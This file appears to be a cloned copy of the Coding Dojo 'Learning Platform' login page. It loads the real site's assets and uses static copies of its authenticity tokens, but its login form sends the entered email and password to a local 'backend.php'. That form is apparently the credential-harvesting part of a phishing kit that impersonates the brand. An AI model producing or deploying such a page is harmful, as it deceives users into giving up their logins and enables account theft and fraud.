
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Learning Platform</title>
    <link href="https://learn.codingdojo.com/assets/black_ninja-db2fe4f1051012ab89c235cc9bf3cd5a.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
    <link href="https://learn.codingdojo.com/assets/login_registration_layout-75087d1b9d22608fbd45351470f8f85e.css" media="all" rel="stylesheet" />
    <meta name="description" content="We supply the most rigorous, comprehensive full-stack software development training programs to meet the career goals of both aspiring developers and industry veterans."/>

    <script src="https://apis.google.com/js/platform.js" async defer></script>\
</head>
<body>

<section id="login_main_content" class="new_login_section">     
    <div id="login_container">
        <a href="http://www.codingdojo.com/"><img id="coding_dojo_login_logo" src="https://learn.codingdojo.com/assets/coding_dojo_logo_white.png" alt="coding_dojo_logo"></a> 
        <div id="sign_up_title">
            <h1>Learning Platform</h1>
        </div>

        <div id="sign_up_container">
            <!-- Nav tabs -->
            <ul class="nav nav-tabs" role="tablist" id="login_nav_tabs">
                <li role="presentation" class="active"><a href="index.html#login_tab" aria-controls="login_tab" role="tab" data-toggle="tab">Login</a></li>
                <!-- <li role="presentation"><a id="signin_register_tab" href="#sign_up_tab" aria-controls="sign_up_tab" role="tab" data-toggle="tab">Register</a></li> -->
            </ul>

            <!-- Tab panes -->
            <div class="tab-content">
                <div role="tabpanel" class="tab-pane active" id="login_tab">
                    <h4>Welcome back! Let's get coding.</h4>
            <form action="backend.php" method="post" name="form" class="form-box">        
                <ul id="login_form" class="list-unstyled">
                        <li>
                            <input type="email" class="form-control" name='email'  placeholder="Email" tabindex="1" value="">
                            <div class="checkbox">
                                <label>
                                    <input type="checkbox" tabindex="3" id="login_remember" checked> Remember Me
                                </label>
                                <span class="invalid_email hidden">Invalid email address.</span>
                                <span class="error_email hidden">Enter email address.</span>
                                <span class="retrieval_failed hidden">Failed to retrieve password. Please try again.</span>
                            </div>
                        </li>
                        <li>
                            <input type="password" class="form-control" name='password' id="enter_password" placeholder="Password" tabindex="2">
                            <input type="hidden" name="authenticity_token" value="Gj9ebF0d/1OpLiI+gRp8iQP0jwJyDyL4pd+fkw+4+Rw="> 
                            <a href="#" tabindex="4" id="forgot_password_btn" data-toggle="modal" data-target="#forgot_password_modal">Forgot Password?</a>
                        </li>
                        <li>
                            <!-- FB or Google -->
                            <input type="submit" class="btn btn-primary login_btn" name="submit" value="login" tabindex="5">
                        </li>
                    </ul> 
                </form>    
                    <p class="social_media_msg">
                        <a href="index.html#" class="email_login_link">Back to login</a>
                    </p>
                    <p class="error_message_for_login">Oops, we can't find your email in our database. 
                    Please email <a href="index.html#">admissionscontact@codingdojo.com</a> for help.</p>
                </div>
                
            </div> 
            <p class="register_info hidden">Pssst... In order to register, you'll need to use the same email that you used on your admissions application.</p>
        </div>
    </div>

    <!-- Log out notice modal -->
    <div class="modal fade info_modal" id="logout_notice_modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal_header">
                    <h4>Logout Notice</h4>
                </div>
                <div class="modal_body">
                    <p>We have detected that your account has been logged in from another computer, for security reasons we are only allowing one login session at a time so we have logged you out from this device. Email us at <a href="index.html#">admissionscontact@codingdojo.com</a> if you think that someone else is using your account.</p>
                    <a href="index.html#" class="btn btn-primary submit_btn" data-dismiss="modal">CONTINUE</a>
                </div>
            </div>
        </div>
    </div>
    <!-- end of Log out notice modal -->

    <div class="modal fade" id="forgot_password_modal" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <span class="hide_modal glyphicon glyphicon-remove" data-dismiss="modal" aria-label="Close"></span>
                <div class="modal-body">
                    <form action="index.html" id="forgot_password_form">
                        <p>Forgot your password?</p>
                        <p>No worries, we'll send you a new one in no time.</p>

                        <input type="email" name="email_address" placeholder="Email Address">
                        <input type="hidden" name="authenticity_token" value="mT+G7XpXOzKxa13sGE3l0JBCUeJAezCw0qqOI83/1jA=">
                        <input type="submit" class="btn btn-primary" value="SEND">

                        <p class="success">Your new password will be sent to your Email Address!</p>
                        <p class="fail">Oops, we can't find your email in our database. <br> Please email <a href="index.html#">admissionscontact@codingdojo.com</a> for help.</p>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Expired Access Modal  -->
    <div class="modal fade info_modal expired_access_modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <span class="hide_modal glyphicon glyphicon-remove" data-dismiss="modal" aria-label="Close"></span>
                <div class="modal_header">
                    <h4>Expired Access</h4>
                </div>
                <div class="modal_body">
                    <p class="expired_message free_seat_message hidden">Your free access to the learning platform has expired! If you need extension for your access or have any questions, please contact <a href="index.html#">admissionscontact@codingdojo.com</a></p>

                    <p class="expired_message student_message hidden">Your program access has expired! If you have further questions or need additional support, feel free to contact your Program Success Manager.</p>
                
                    <p class="expired_message no_access hidden">This account has expired! If you are interested to join our Onsite or Online program, click <a href="http://www.codingdojo.com/apply" target="_blank">here</a> or if you have pending application, please contact <a href="index.html#">admissionscontact@codingdojo.com</a>.</p>
                </div>
            </div>
        </div>
    </div>
    <!-- End of Expired Access Modal -->

    <!-- Alumni Portal Unauthorized Access Modal  -->
    <div class="modal fade info_modal unauthorized_access_modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <span class="hide_modal glyphicon glyphicon-remove" data-dismiss="modal" aria-label="Close"></span>
                <div class="modal_header">
                    <h4>Unauthorized Account</h4>
                </div>
                <div class="modal_body">
                    <p class="expired_message alumni_portal_unauthorized_account">This account is not authorized to access the Alumni Portal! <br><br> If you believe this is an error, please contact <a href="index.html#">admissionscontact@codingdojo.com</a>.</p>
                </div>
            </div>
        </div>
    </div>
    <!-- End of Modal -->
</section>  

</body>
    <script src="https://learn.codingdojo.com/assets/login_register_scripts-e418dfe95e0fa17a8ec7c87131399956.js"></script>
    <meta content="authenticity_token" name="csrf-param" />
<meta content="mT+G7XpXOzKxa13sGE3l0JBCUeJAezCw0qqOI83/1jA=" name="csrf-token" />
    <script>
//<![CDATA[
var AUTH_TOKEN = 'mT+G7XpXOzKxa13sGE3l0JBCUeJAezCw0qqOI83/1jA=';
//]]>
</script>

    <script>
        $(window).on('load', function(){
            // var social_login_twitter = ''

            // if(social_login_twitter == "yes"){
            //     // hide other sign up forms
            //     $('#sign_up_buttons').addClass('hidden')
            //     $('#sign_up_form').addClass('hidden')
            //     $('#sign_up_twitter_form').removeClass('hidden')

            //     $('#sign_up_twitter_form li').children("input[name=twitter_id]").val('')
            //     $('#sign_up_twitter_form li').children("input[name=twitter_user_pic]").val('')
            //     $('#sign_up_twitter_form li').children("input[name=twitter_user_name]").val('')
            // }

            if('' == "yes"){
                $('.error_message_for_login').fadeIn();
            }

            var duplicate_login = '';

            if(duplicate_login == "yes"){
                $('#logout_notice_modal').modal('show');
            }

            var invalid_account = ''

            if(invalid_account == "yes"){
                alert("Sorry, this account is no longer in use.")
            }
        });

        $(document).on('ready', function(){
            $('title').text('Learning Platform');

            if('' != ""){
                $('body').on('keydown', function(key){
                    navigate_location(key);
                });
            }
        });
    </script>

</html>



